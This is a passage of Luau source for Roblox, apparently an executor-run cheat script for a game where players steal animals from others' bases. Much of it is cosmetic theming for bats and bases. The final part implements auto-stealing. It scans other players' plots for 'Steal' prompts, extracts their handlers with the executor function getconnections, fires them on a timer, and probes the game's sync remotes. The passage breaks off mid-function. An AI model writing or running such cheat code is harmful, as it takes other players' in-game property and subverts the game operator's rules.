            pcall(function()
                if part:IsA("MeshPart") and part.TextureID ~= "" then
                    if not part:GetAttribute("BatThemeOrigTex") then
                        part:SetAttribute("BatThemeOrigTex", part.TextureID)
                    end
                    part.TextureID = ""
                end
                -- SurfaceAppearance blocks color
                for _, ch in ipairs(part:GetChildren()) do
                    if ch:IsA("SurfaceAppearance") then
                        ch.Name = "BatThemeHiddenSA"
                        ch.Parent = nil -- park it; restore not perfect but color will show
                    end
                end
                part.Color = theme.color
                part.Material = theme.material or Enum.Material.SmoothPlastic
                part.Reflectance = theme.reflectance or 0
                if theme.transparency then
                    part.Transparency = theme.transparency
                elseif part.Transparency < 1 then
                    -- keep solid unless crystal
                    if batThemeMode ~= "Crystal" then
                        part.Transparency = 0
                    end
                end
            end)
        end
    end

    -- also color direct children parts
    for _, part in ipairs(tool:GetChildren()) do
        if part:IsA("BasePart") then
            savePartOriginals(part)
            pcall(function()
                if part:IsA("MeshPart") and part.TextureID ~= "" then
                    part:SetAttribute("BatThemeOrigTex", part.TextureID)
                    part.TextureID = ""
                end
                part.Color = theme.color
                part.Material = theme.material or Enum.Material.SmoothPlastic
                part.Reflectance = theme.reflectance or 0
            end)
        end
    end

    local hl = Instance.new("Highlight")
    hl.Name = "BatThemeHighlight"
    hl.FillColor = theme.color
    hl.OutlineColor = Color3.new(
        math.min(1, theme.color.R + 0.3),
        math.min(1, theme.color.G + 0.3),
        math.min(1, theme.color.B + 0.3)
    )
    hl.FillTransparency = (batThemeMode == "Dark") and 0.35 or 0.55
    hl.OutlineTransparency = 0.1
    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    hl.Parent = tool

    -- Particles for Fire / Neon
    if theme.particles and handle then
        local att = handle:FindFirstChild("BatThemeAtt") or Instance.new("Attachment")
        att.Name = "BatThemeAtt"
        att.Parent = handle
        local p = Instance.new("ParticleEmitter")
        p.Name = "BatThemeParticles"
        p.Texture = "rbxasset://textures/particles/smoke_main.dds"
        p.Rate = 20
        p.Lifetime = NumberRange.new(0.3, 0.6)
        p.Speed = NumberRange.new(1, 3)
        p.SpreadAngle = Vector2.new(30, 30)
        p.Size = NumberSequence.new(0.4, 0.1)
        p.Transparency = NumberSequence.new(0.2, 1)
        p.LightEmission = 0.8
        if theme.particles == "fire" then
            p.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 50)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 40, 0)),
            })
            p.Acceleration = Vector3.new(0, 4, 0)
        else -- neon
            p.Color = ColorSequence.new(theme.color)
            p.Acceleration = Vector3.new(0, 2, 0)
        end
        p.Parent = att
    end

    -- Avatar overlays
    if theme.useAvatar and handle then
        local thumb = resolveBatThemeThumb()
        if thumb then
            for _, face in ipairs({
                Enum.NormalId.Front, Enum.NormalId.Back,
                Enum.NormalId.Left, Enum.NormalId.Right
            }) do
                local dec = Instance.new("Decal")
                dec.Name = "BatThemeDecal"
                dec.Face = face
                dec.Texture = thumb
                dec.Parent = handle
            end
            local bb = Instance.new("BillboardGui")
            bb.Name = "BatThemeGui"
            bb.Size = UDim2.fromOffset(70, 70)
            bb.StudsOffset = Vector3.new(0, 2, 0)
            bb.AlwaysOnTop = true
            bb.MaxDistance = 50
            bb.Parent = handle
            local img = Instance.new("ImageLabel")
            img.Size = UDim2.fromScale(1, 1)
            img.BackgroundTransparency = 1
            img.Image = thumb
            img.Parent = bb
        end
    end
end

local function refreshBatToolTheme()
    for _, tool in ipairs(getBatTools()) do
        stripBatThemeFromTool(tool)
    end
    for _, c in ipairs(batThemeConns) do
        pcall(function() c:Disconnect() end)
    end
    batThemeConns = {}

    if batThemeMode == "Normal" or not BAT_TOOL_THEMES[batThemeMode] then
        return
    end

    for _, tool in ipairs(getBatTools()) do
        applyBatThemeToTool(tool)
    end

    local char = LP.Character
    if char then
        table.insert(batThemeConns, char.ChildAdded:Connect(function(ch)
            if ch:IsA("Tool") and ch.Name:lower():find("bat") then
                task.defer(function() applyBatThemeToTool(ch) end)
            end
        end))
    end
    local bp = LP:FindFirstChild("Backpack")
    if bp then
        table.insert(batThemeConns, bp.ChildAdded:Connect(function(ch)
            if ch:IsA("Tool") and ch.Name:lower():find("bat") then
                task.defer(function() applyBatThemeToTool(ch) end)
            end
        end))
    end
end

function applyBatTheme(mode)
    batThemeMode = mode or batThemeMode or "Normal"
    refreshBatToolTheme()

-- Rainbow bat continuous color shift
if _G.__batRainbowConn then
    pcall(function() _G.__batRainbowConn:Disconnect() end)
    _G.__batRainbowConn = nil
end
if batThemeMode == "Rainbow" then
    local t0 = tick()
    _G.__batRainbowConn = RunService.Heartbeat:Connect(function()
        if batThemeMode ~= "Rainbow" then return end
        local hue = (tick() - t0) * 0.25 % 1
        local col = Color3.fromHSV(hue, 0.85, 1)
        for _, tool in ipairs(getBatTools()) do
            for _, p in ipairs(tool:GetDescendants()) do
                if p:IsA("BasePart") then
                    pcall(function() p.Color = col end)
                end
                if p:IsA("Highlight") and p.Name == "BatThemeHighlight" then
                    pcall(function()
                        p.FillColor = col
                        p.OutlineColor = Color3.fromHSV(hue, 0.5, 1)
                    end)
                end
            end
        end
    end)
end

    return batThemeMode
end

function cycleBatTheme()
    local order = BAT_THEME_ORDER or {"Normal", "Avatar", "Neon", "Gold", "Dark", "Crystal", "Fire", "Ice", "Toxic", "Blood", "Galaxy", "White", "Rainbow"}
    local idx = 1
    for i, n in ipairs(order) do
        if n == tostring(batThemeMode) then idx = i break end
    end
    idx = idx % #order + 1
    local nextMode = order[idx]
    applyBatTheme(nextMode)
    return nextMode
end

function setBatToolSkin(on)
    if on then applyBatTheme("Avatar") else applyBatTheme("Normal") end
end

local function clearFireBase()
    if _G.__baseFireFolder then
        pcall(function() _G.__baseFireFolder:Destroy() end)
        _G.__baseFireFolder = nil
    end
    if _G.__baseFireConn then
        pcall(function() _G.__baseFireConn:Disconnect() end)
        _G.__baseFireConn = nil
    end
end
local function createFireBase(plot)
    clearFireBase()
end

local function clearRomaniaBase()
    if _G.__baseDragonFolder then
        pcall(function() _G.__baseDragonFolder:Destroy() end)
        _G.__baseDragonFolder = nil
    end
    if _G.__baseRomaniaFolder then
        pcall(function() _G.__baseRomaniaFolder:Destroy() end)
        _G.__baseRomaniaFolder = nil
    end
    if _G.__baseDragonConn then
        pcall(function() _G.__baseDragonConn:Disconnect() end)
        _G.__baseDragonConn = nil
    end
    if _G.__baseRomaniaConn then
        pcall(function() _G.__baseRomaniaConn:Disconnect() end)
        _G.__baseRomaniaConn = nil
    end
end
-- legacy alias
local clearDragonBase = clearRomaniaBase

local function createHorseModel(parent, cf, scale)
    scale = scale or 1
    local model = Instance.new("Model")
    model.Name = "OceanHorse"
    model.Parent = parent

    local bodyCol = Color3.fromRGB(90, 55, 30)      -- brown
    local darkCol = Color3.fromRGB(40, 25, 15)      -- dark brown
    local maneCol = Color3.fromRGB(25, 15, 10)      -- almost black mane
    local whiteCol = Color3.fromRGB(240, 235, 220)

    local function p(size, localCf, col, shape)
        local part = Instance.new("Part")
        part.Name = "HorsePart"
        part.Anchored = true
        part.CanCollide = false
        part.Material = Enum.Material.SmoothPlastic
        part.Color = col
        part.Size = size * scale
        part.CFrame = cf * localCf
        if shape == "ball" then part.Shape = Enum.PartType.Ball
        elseif shape == "cyl" then part.Shape = Enum.PartType.Cylinder end
        part.Parent = model
        return part
    end
    local function w(size, localCf, col)
        local part = Instance.new("WedgePart")
        part.Name = "HorsePart"
        part.Anchored = true
        part.CanCollide = false
        part.Material = Enum.Material.SmoothPlastic
        part.Color = col
        part.Size = size * scale
        part.CFrame = cf * localCf
        part.Parent = model
        return part
    end

    -- Body
    p(Vector3.new(2.2, 2.4, 4.5), CFrame.new(0, 3.2, 0), bodyCol)
    -- Chest
    p(Vector3.new(2, 2.2, 1.8), CFrame.new(0, 3.3, -2), bodyCol)
    -- Neck
    p(Vector3.new(1.3, 1.5, 2.2), CFrame.new(0, 4.5, -3.2) * CFrame.Angles(math.rad(-35), 0, 0), bodyCol)
    -- Head
    p(Vector3.new(1.2, 1.3, 1.8), CFrame.new(0, 5.5, -4.5), bodyCol)
    -- Snout
    p(Vector3.new(0.9, 0.8, 1.2), CFrame.new(0, 5.2, -5.5), bodyCol)
    -- Ears
    w(Vector3.new(0.35, 0.7, 0.35), CFrame.new(-0.35, 6.3, -4.2), darkCol)
    w(Vector3.new(0.35, 0.7, 0.35), CFrame.new(0.35, 6.3, -4.2), darkCol)
    -- Eyes
    p(Vector3.new(0.25, 0.25, 0.25), CFrame.new(-0.45, 5.7, -5.2), Color3.fromRGB(20, 15, 10), "ball")
    p(Vector3.new(0.25, 0.25, 0.25), CFrame.new(0.45, 5.7, -5.2), Color3.fromRGB(20, 15, 10), "ball")
    -- Mane
    for i = 0, 4 do
        p(Vector3.new(0.4, 0.9, 0.5), CFrame.new(0, 5.2 + i * 0.05, -3.8 + i * 0.35), maneCol)
    end
    -- Tail
    p(Vector3.new(0.5, 0.5, 2.5), CFrame.new(0, 3.5, 3.5) * CFrame.Angles(math.rad(25), 0, 0), maneCol)
    p(Vector3.new(0.6, 0.6, 1.5), CFrame.new(0, 2.8, 5) * CFrame.Angles(math.rad(40), 0, 0), maneCol)
    -- Legs
    for _, x in ipairs({-0.7, 0.7}) do
        p(Vector3.new(0.7, 2.8, 0.7), CFrame.new(x, 1.4, -1.5), bodyCol)
        p(Vector3.new(0.7, 2.8, 0.7), CFrame.new(x, 1.4, 1.5), bodyCol)
        p(Vector3.new(0.85, 0.4, 1.1), CFrame.new(x, 0.25, -1.7), darkCol)
        p(Vector3.new(0.85, 0.4, 1.1), CFrame.new(x, 0.25, 1.7), darkCol)
    end
    p(Vector3.new(0.15, 1.6, 1.8), CFrame.new(-1.15, 3.8, 0), Color3.fromRGB(0, 43, 127))
    p(Vector3.new(0.15, 1.6, 1.8), CFrame.new(-1.0, 3.8, 0), Color3.fromRGB(252, 209, 22))
    p(Vector3.new(0.15, 1.6, 1.8), CFrame.new(-0.85, 3.8, 0), Color3.fromRGB(206, 17, 38))

    return model
end

local function applyRomaniaFlagColors(plot)
    -- NEVER recolor windows / glass
    local blue = Color3.fromRGB(0, 43, 127)
    local yellow = Color3.fromRGB(252, 209, 22)
    local red = Color3.fromRGB(206, 17, 38)
    local dark = Color3.fromRGB(20, 25, 50)

    local function isWindow(d)
        if not d or not d:IsA("BasePart") then return true end
        -- transparent / glass parts = windows
        if d.Transparency > 0.12 and d.Transparency < 0.98 then return true end
        if d.Material == Enum.Material.Glass or d.Material == Enum.Material.ForceField then return true end
        local n = string.lower(tostring(d.Name or ""))
        if n:find("window") or n:find("glass") or n:find("pane") or n:find("screen") then return true end
        local sz = d.Size
        if sz.Y >= 2 and (sz.X < 1.5 or sz.Z < 1.5) and d.Transparency > 0.05 then return true end
        return false
    end

    local minX, maxX = math.huge, -math.huge
    local parts = {}
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) and not isWindow(d) then
            table.insert(parts, d)
            if d.Position.X < minX then minX = d.Position.X end
            if d.Position.X > maxX then maxX = d.Position.X end
        end
    end
    local span = math.max(maxX - minX, 1)
    for _, d in ipairs(parts) do
        local t = (d.Position.X - minX) / span
        local col
        if t < 0.33 then
            col = blue
        elseif t < 0.66 then
            col = yellow
        else
            col = red
        end
        local sz = d.Size
        local vol = sz.X * sz.Y * sz.Z
        local isFrame = (sz.X < 1.2 or sz.Z < 1.2 or sz.Y < 0.6) and vol < 40
        pcall(function()
            saveBasePartColor(d)
            if isFrame then
                d.Color = dark
                d.Material = Enum.Material.SmoothPlastic
            else
                d.Color = col
                d.Material = Enum.Material.SmoothPlastic
            end
            d.Reflectance = 0
        end)
    end
end

local function createRomaniaBase(plot)
    clearRomaniaBase()
    if not plot then return end

    local folder = Instance.new("Folder")
    folder.Name = "OceanBaseRomania"
    folder.Parent = workspace
    _G.__baseRomaniaFolder = folder

    -- flag stripe colors on building
    applyRomaniaFlagColors(plot)

    local center = Vector3.zero
    local count = 0
    local minY = math.huge
    local maxX, maxZ = 10, 10
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            center = center + d.Position
            count = count + 1
            local b = d.Position.Y - d.Size.Y * 0.5
            if b < minY then minY = b end
        end
    end
    if count > 0 then center = center / count end
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            maxX = math.max(maxX, math.abs(d.Position.X - center.X) + d.Size.X * 0.5)
            maxZ = math.max(maxZ, math.abs(d.Position.Z - center.Z) + d.Size.Z * 0.5)
        end
    end
    if minY == math.huge then minY = center.Y end

    local dist = math.max(maxX, maxZ) + 8
    local y = minY

    -- LEFT horse (faces toward base)
    local horseScale = 1.25  -- same size both sides
    local leftCf = CFrame.new(center.X - dist, y, center.Z) * CFrame.Angles(0, math.rad(90), 0)
    createHorseModel(folder, leftCf, horseScale)

    -- RIGHT horse (identical scale)
    local rightCf = CFrame.new(center.X + dist, y, center.Z) * CFrame.Angles(0, math.rad(-90), 0)
    createHorseModel(folder, rightCf, horseScale)

    -- gentle bob
    local t0 = tick()
    local horses = {}
    for _, ch in ipairs(folder:GetChildren()) do
        if ch:IsA("Model") then
            local parts = {}
            for _, p in ipairs(ch:GetDescendants()) do
                if p:IsA("BasePart") then
                    table.insert(parts, {part = p, origin = p.CFrame})
                end
            end
            table.insert(horses, parts)
        end
    end
    _G.__baseRomaniaConn = RunService.Heartbeat:Connect(function()
        if baseThemeMode ~= "Romania" then return end
        local t = tick() - t0
        local bob = math.sin(t * 1.8) * 0.2
        for _, parts in ipairs(horses) do
            for _, info in ipairs(parts) do
                if info.part and info.part.Parent then
                    pcall(function()
                        info.part.CFrame = info.origin * CFrame.new(0, bob, 0)
                    end)
                end
            end
        end
    end)
end

-- legacy name so old calls still work
local function createDragonBase(plot)
    createRomaniaBase(plot)
end

local function clearSakuraBase()
    if _G.__baseSakuraFolder then
        pcall(function() _G.__baseSakuraFolder:Destroy() end)
        _G.__baseSakuraFolder = nil
    end
end

local function createSakuraBase(plot)
    clearSakuraBase()
    if not plot then return end

    local folder = Instance.new("Folder")
    folder.Name = "OceanBaseSakura"
    folder.Parent = workspace
    _G.__baseSakuraFolder = folder

    local center = Vector3.zero
    local count = 0
    local minY, maxY = math.huge, -math.huge
    local maxX, maxZ = 10, 10
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            center = center + d.Position
            count = count + 1
            local b = d.Position.Y - d.Size.Y * 0.5
            local t = d.Position.Y + d.Size.Y * 0.5
            if b < minY then minY = b end
            if t > maxY then maxY = t end
        end
    end
    if count > 0 then center = center / count end
    for _, d in ipairs(plot:GetDescendants()) do
        if d:IsA("BasePart") and not shouldSkipBasePart(d) then
            maxX = math.max(maxX, math.abs(d.Position.X - center.X) + d.Size.X * 0.5)
            maxZ = math.max(maxZ, math.abs(d.Position.Z - center.Z) + d.Size.Z * 0.5)
        end
    end
    if minY == math.huge then minY = center.Y end
    if maxY == -math.huge then maxY = center.Y + 15 end

    local pinks = {
        Color3.fromRGB(255, 170, 210),
        Color3.fromRGB(255, 130, 185),
        Color3.fromRGB(255, 200, 225),
        Color3.fromRGB(255, 105, 165),
        Color3.fromRGB(255, 190, 215),
    }

    local function addPetalEmitter(worldPos, rate, sizeMul)
        sizeMul = sizeMul or 1
        local host = Instance.new("Part")
        host.Name = "SakuraPetalHost"
        host.Anchored = true
        host.CanCollide = false
        host.Transparency = 1
        host.Size = Vector3.new(4, 1, 4)
        host.Position = worldPos
        host.Parent = folder

        local att = Instance.new("Attachment")
        att.Parent = host

        -- main petals
        local p = Instance.new("ParticleEmitter")
        p.Name = "Petals"
        p.Texture = "rbxasset://textures/particles/smoke_main.dds"
        p.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, pinks[1]),
            ColorSequenceKeypoint.new(0.5, pinks[2]),
            ColorSequenceKeypoint.new(1, pinks[3]),
        })
        p.Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.55 * sizeMul),
            NumberSequenceKeypoint.new(0.5, 0.7 * sizeMul),
            NumberSequenceKeypoint.new(1, 0.3 * sizeMul),
        })
        p.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.05),
            NumberSequenceKeypoint.new(0.75, 0.25),
            NumberSequenceKeypoint.new(1, 1),
        })
        p.Lifetime = NumberRange.new(5, 9)
        p.Rate = rate
        p.Speed = NumberRange.new(0.4, 2.2)
        p.SpreadAngle = Vector2.new(55, 55)
        p.Rotation = NumberRange.new(0, 360)
        p.RotSpeed = NumberRange.new(-90, 90)
        p.Acceleration = Vector3.new(0, -2.8, 0)
        p.Drag = 0.8
        p.LightEmission = 0.25
        p.VelocityInheritance = 0
        p.Parent = att

        -- smaller dense petals
        local p2 = Instance.new("ParticleEmitter")
        p2.Name = "PetalsSmall"
        p2.Texture = "rbxasset://textures/particles/smoke_main.dds"
        p2.Color = ColorSequence.new(pinks[4])
        p2.Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.3 * sizeMul),
            NumberSequenceKeypoint.new(1, 0.18 * sizeMul),
        })
        p2.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.1),
            NumberSequenceKeypoint.new(1, 1),
        })
        p2.Lifetime = NumberRange.new(4, 7)
        p2.Rate = rate * 1.2
        p2.Speed = NumberRange.new(0.2, 1.5)
        p2.SpreadAngle = Vector2.new(60, 60)
        p2.Rotation = NumberRange.new(0, 360)
        p2.RotSpeed = NumberRange.new(-120, 120)
        p2.Acceleration = Vector3.new(0, -3.2, 0)
        p2.Drag = 1
        p2.LightEmission = 0.2
        p2.Parent = att

        -- sparkly flower bits
        local p3 = Instance.new("ParticleEmitter")
        p3.Name = "PetalSpark"
        p3.Texture = "rbxasset://textures/particles/sparkles_main.dds"
        p3.Color = ColorSequence.new(Color3.fromRGB(255, 220, 235))
        p3.Size = NumberSequence.new(0.25 * sizeMul, 0.1 * sizeMul)
        p3.Transparency = NumberSequence.new(0.2, 1)
        p3.Lifetime = NumberRange.new(2, 4)
        p3.Rate = rate * 0.5
        p3.Speed = NumberRange.new(0.3, 1.2)
        p3.SpreadAngle = Vector2.new(40, 40)
        p3.Acceleration = Vector3.new(0, -2, 0)
        p3.LightEmission = 0.6
        p3.Parent = att
    end

    local top = maxY + 10
    local radius = math.max(maxX, maxZ) * 1.1

    -- ring of petal rain above base
    for i = 0, 15 do
        local a = (i / 16) * math.pi * 2
        local r = radius * (0.4 + (i % 3) * 0.25)
        local pos = Vector3.new(center.X + math.cos(a) * r, top + (i % 4) * 1.5, center.Z + math.sin(a) * r)
        addPetalEmitter(pos, 22, 1.1)
    end

    -- heavy center fall
    addPetalEmitter(Vector3.new(center.X, top + 3, center.Z), 40, 1.3)
    addPetalEmitter(Vector3.new(center.X + 4, top + 2, center.Z), 20, 1)
    addPetalEmitter(Vector3.new(center.X - 4, top + 2, center.Z), 20, 1)
    addPetalEmitter(Vector3.new(center.X, top + 2, center.Z + 4), 20, 1)
    addPetalEmitter(Vector3.new(center.X, top + 2, center.Z - 4), 20, 1)

    for i = 0, 7 do
        local a = (i / 8) * math.pi * 2
        local pos = Vector3.new(
            center.X + math.cos(a) * (radius + 2),
            minY + 6 + (i % 3) * 2,
            center.Z + math.sin(a) * (radius + 2)
        )
        addPetalEmitter(pos, 10, 0.9)
    end
end

function applyBaseTheme(mode)
    mode = mode or baseThemeMode or "Normal"
    baseThemeMode = mode

    if baseThemeConn then
        pcall(function() baseThemeConn:Disconnect() end)
        baseThemeConn = nil
    end
    if _G.__baseRainbowConn then
        pcall(function() _G.__baseRainbowConn:Disconnect() end)
        _G.__baseRainbowConn = nil
    end
    clearBaseHubSign()
    if clearBatDecor then clearBatDecor() end
    if clearFireBase then clearFireBase() end
    if clearRomaniaBase then clearRomaniaBase() end
    if clearSakuraBase then clearSakuraBase() end
    if clearDragonBase then clearDragonBase() end

    if mode == "Normal" or not BASE_THEMES[mode] then
        restoreBaseColors()
        if _G.__baseSnowFolder then
            pcall(function() _G.__baseSnowFolder:Destroy() end)
            _G.__baseSnowFolder = nil
        end
        if _G.__baseSnowConn then
            pcall(function() _G.__baseSnowConn:Disconnect() end)
            _G.__baseSnowConn = nil
        end
        return true
    end

    local plot = getMyPlot()
    if not plot then
        warn("[Base Changer] Could not find your plot/base")
        return false, "Plot not found"
    end

    if applyOceanUserSign then applyOceanUserSign(plot) end

    local theme = BASE_THEMES[mode]
    local i = 0
    for _, desc in ipairs(plot:GetDescendants()) do
        if desc:IsA("BasePart") then
            applyThemeToPart(desc, theme, i)
            i = i + 1
        end
    end

    baseThemeConn = plot.DescendantAdded:Connect(function(desc)
        if baseThemeMode ~= mode then return end
        if desc:IsA("BasePart") then
            task.defer(function()
                applyThemeToPart(desc, theme, i)
                i = i + 1
            end)
        end
    end)

    -- Stop previous snow
    if _G.__baseSnowFolder then
        pcall(function() _G.__baseSnowFolder:Destroy() end)
        _G.__baseSnowFolder = nil
    end
    if _G.__baseSnowConn then
        pcall(function() _G.__baseSnowConn:Disconnect() end)
        _G.__baseSnowConn = nil
    end

    if mode == "Rainbow" then
        local t0 = tick()
        local SPEED = 0.12 -- hue cycles per second (smooth)
        _G.__baseRainbowConn = RunService.Heartbeat:Connect(function()
            if baseThemeMode ~= "Rainbow" then return end
            local plot2 = getMyPlot()
            if not plot2 then return end
            local hue = (tick() - t0) * SPEED % 1
            local col = Color3.fromHSV(hue, 0.7, 1)
            local dark = Color3.fromHSV(hue, 0.85, 0.35)
            for _, desc in ipairs(plot2:GetDescendants()) do
                if desc:IsA("BasePart") and not shouldSkipBasePart(desc) then
                    local sz = desc.Size
                    local vol = sz.X * sz.Y * sz.Z
                    local isFrame = (sz.X < 1.2 or sz.Z < 1.2 or sz.Y < 0.6) and vol < 40
                    local isFloor = sz.Y < 1.5 and (sz.X > 8 or sz.Z > 8)
                    local isGlass = desc.Transparency > 0.15 and desc.Transparency < 0.95
                    pcall(function()
                        if isFrame or isFloor then
                            desc.Color = dark
                        elseif isGlass then
                            desc.Color = Color3.fromHSV(hue, 0.35, 1)
                        else
                            desc.Color = col
                        end
                    end)
                end
            end
        end)
    end

    if mode == "Snowy" then
        local plot2 = plot
        local folder = Instance.new("Folder")
        folder.Name = "OceanBaseSnow"
        folder.Parent = workspace
        _G.__baseSnowFolder = folder

        -- find a center for the base
        local center = Vector3.new(0, 0, 0)
        local count = 0
        for _, d in ipairs(plot2:GetDescendants()) do
            if d:IsA("BasePart") and not shouldSkipBasePart(d) then
                center = center + d.Position
                count = count + 1
            end
        end
        if count > 0 then center = center / count else
            local pivot = plot2:FindFirstChildWhichIsA("BasePart", true)
            if pivot then center = pivot.Position end
        end

        -- attachment host part (invisible)
        local host = Instance.new("Part")
        host.Name = "SnowHost"
        host.Anchored = true
        host.CanCollide = false
        host.Transparency = 1
        host.Size = Vector3.new(1, 1, 1)
        host.Position = center + Vector3.new(0, 18, 0)
        host.Parent = folder

        local function makeSnowEmitter(offset)
            local att = Instance.new("Attachment")
            att.Position = offset
            att.Parent = host
            local p = Instance.new("ParticleEmitter")
            p.Name = "Snow"
            p.Texture = "rbxasset://textures/particles/smoke_main.dds"
            p.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
            p.Size = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0.15),
                NumberSequenceKeypoint.new(1, 0.08),
            })
            p.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0.2),
                NumberSequenceKeypoint.new(0.7, 0.4),
                NumberSequenceKeypoint.new(1, 1),
            })
            p.Lifetime = NumberRange.new(1.2, 1.5)
            p.Rate = 28
            p.Speed = NumberRange.new(1, 3)
            p.SpreadAngle = Vector2.new(25, 25)
            p.Rotation = NumberRange.new(0, 360)
            p.RotSpeed = NumberRange.new(-40, 40)
            p.LifetimeTime = NumberRange.new(4, 7)
            p.Acceleration = Vector3.new(0, -6, 0)
            p.Drag = 0.3
            p.LightEmission = 0.15
            p.Parent = att
            return p
        end

        makeSnowEmitter(Vector3.new(0, 0, 0))
        makeSnowEmitter(Vector3.new(12, 0, 0))
        makeSnowEmitter(Vector3.new(-12, 0, 0))
        makeSnowEmitter(Vector3.new(0, 0, 12))
        makeSnowEmitter(Vector3.new(0, 0, -12))
        makeSnowEmitter(Vector3.new(8, 0, 8))
        makeSnowEmitter(Vector3.new(-8, 0, -8))

        _G.__baseSnowConn = RunService.Heartbeat:Connect(function()
            if baseThemeMode ~= "Snowy" then return end
            if host and host.Parent then
                host.Position = center + Vector3.new(0, 18, 0)
            end
        end)
    end

    if mode == "Ocean" then
        createOceanWaves(plot)
    end

    if mode == "Stars" then
        createBatDecor(plot)
    end

    if mode == "Romania" then
        createRomaniaBase(plot)
    end

    if mode == "Sakura" then
        createSakuraBase(plot)
    end

    return true
end

function cycleBaseTheme()
    pcall(function() applyBaseTheme("Normal") end)
    baseThemeMode = "Normal"
    return "Normal"
end

function isNearPodiumWithPrompt()
    local char=LP.Character;local hrpL=char and char:FindFirstChild("HumanoidRootPart");if not hrpL then return false end
    local plots=workspace:FindFirstChild("Plots");if not plots then return false end
    for _,plot in ipairs(plots:GetChildren()) do
        if isMyPlotByName(plot.Name) then continue end
        local podiums=plot:FindFirstChild("AnimalPodiums");if not podiums then continue end
        for _,podium in ipairs(podiums:GetChildren()) do
            local base=podium:FindFirstChild("Base");if not base then continue end
            local sp=base:FindFirstChild("Spawn");if not sp then continue end
            local d=(hrpL.Position-sp.Position).Magnitude;if d>Steal.StealRadius then continue end
            local att=sp:FindFirstChild("PromptAttachment");if not att then continue end
            for _,obj in ipairs(att:GetChildren()) do if obj:IsA("ProximityPrompt") and obj.Enabled then return true,d end end
        end
    end
    return false,math.huge
end
function findNearestPrompt()
    local char=LP.Character;if not char then return nil end
    local root=char:FindFirstChild("HumanoidRootPart");if not root then return nil end
    local plots=workspace:FindFirstChild("Plots");if not plots then return nil end
    local nearest,dist=nil,math.huge
    for _,plot in ipairs(plots:GetChildren()) do
        if isMyPlotByName(plot.Name) then continue end
        local pods=plot:FindFirstChild("AnimalPodiums");if not pods then continue end
        for _,pod in ipairs(pods:GetChildren()) do
            local base=pod:FindFirstChild("Base");local sp=base and base:FindFirstChild("Spawn")
            if sp then
                local d=(sp.Position-root.Position).Magnitude
                if d<=Steal.StealRadius and dist>d then
                    local att=sp:FindFirstChild("PromptAttachment")
                    if att then for _,prompt in ipairs(att:GetChildren()) do if prompt:IsA("ProximityPrompt") and prompt.ActionText:find("Steal") then nearest,dist=prompt,d end end end
                end
            end
        end
    end
    return nearest
end
function getPromptSpawnPosition(prompt)
    if not prompt then return nil end
    local parent=prompt.Parent
    if parent and parent.Name=="PromptAttachment" then parent=parent.Parent end
    if parent and parent.Name=="Spawn" and parent:IsA("BasePart") then return parent.Position end
    return nil
end

function isStealTargetClose(spawnPosition)
    if not spawnPosition then return false end
    local character=LP.Character
    local root=character and character:FindFirstChild("HumanoidRootPart")
    return root~=nil and (spawnPosition-root.Position).Magnitude<=9
end

function executeSteal(prompt)
    if isStealing then return end
    if not Steal.Data[prompt] then
        Steal.Data[prompt]={hold={},trigger={},ready=true}
        if getconnections then
            local okH, holdC = pcall(getconnections, prompt.PromptButtonHoldBegan)
            local okT, trigC = pcall(getconnections, prompt.Triggered)
            if okH and type(holdC)=="table" then
                for _,c in ipairs(holdC) do if c and c.Function then table.insert(Steal.Data[prompt].hold,c.Function) end end
            end
            if okT and type(trigC)=="table" then
                for _,c in ipairs(trigC) do if c and c.Function then table.insert(Steal.Data[prompt].trigger,c.Function) end end
            end
        end
    end
    local data=Steal.Data[prompt];if not data.ready then return end
    data.ready=false;isStealing=true;stealStartTime=tick()
    task.spawn(function()
        for _,fn in ipairs(data.hold) do task.spawn(fn) end
        task.wait(Steal.StealDuration or 1.3)
        if isStealing and Steal.AutoStealEnabled and prompt.Parent then
            for _,fn in ipairs(data.trigger) do task.spawn(fn) end
        end
        data.ready=true;isStealing=false;stealStartTime=nil
        normalStealProgress=0;normalStealPaused=false
        pcall(function() getgenv()._AS_StealProgress=0 end)
    end)
end
startAutoSteal=function()
    if stealMode=="semi" then
        if startSemiAutoSteal then startSemiAutoSteal() end
        return
    end
    pcall(function() getgenv()._AS_StealProgress=0 end)
    if Conns.autoSteal then return end
    local nextScan=0
    Conns.autoSteal=RunService.Heartbeat:Connect(function()
        if not Steal.AutoStealEnabled or isStealing then return end
        local now=os.clock()
        if now<nextScan then return end
        nextScan=now+0.15
        local p=findNearestPrompt();if p then executeSteal(p) end
    end)
end

stopAutoSteal=function()
    if stopSemiAutoSteal then stopSemiAutoSteal() end
    if Conns.autoSteal then Conns.autoSteal:Disconnect();Conns.autoSteal=nil end
    isStealing=false;stealStartTime=nil
    normalStealProgress=0;normalStealPaused=false
    pcall(function() getgenv()._AS_StealProgress=0 end)
end
;(function() -- semi-auto steal scope
local RS = game:GetService("ReplicatedStorage")
local SEMI_CONFIG = SemiSteal.CONFIG

local syncRemotes = nil
local plots = nil
pcall(function()
    plots = workspace:WaitForChild("Plots", 8)
    local folder = RS:WaitForChild("Packages", 8):WaitForChild("Synchronizer", 8)
    syncRemotes = {
        channelFolder = folder:WaitForChild("Channel", 8),
        routeRemote   = folder:WaitForChild("CommunicationRoute", 8),
        requestData   = folder:FindFirstChild("RequestData"),
    }
end)

local AnimalsData = nil
pcall(function()
    AnimalsData = require(RS:WaitForChild("Datas", 8):WaitForChild("Animals", 8))
end)

local plotAnimalSync = { caches = {}, connections = {} }
local allAnimalsCache = {}
local SemiPromptCache = {}
local SemiCallbackCache = {}

local function splitSyncPath(path)
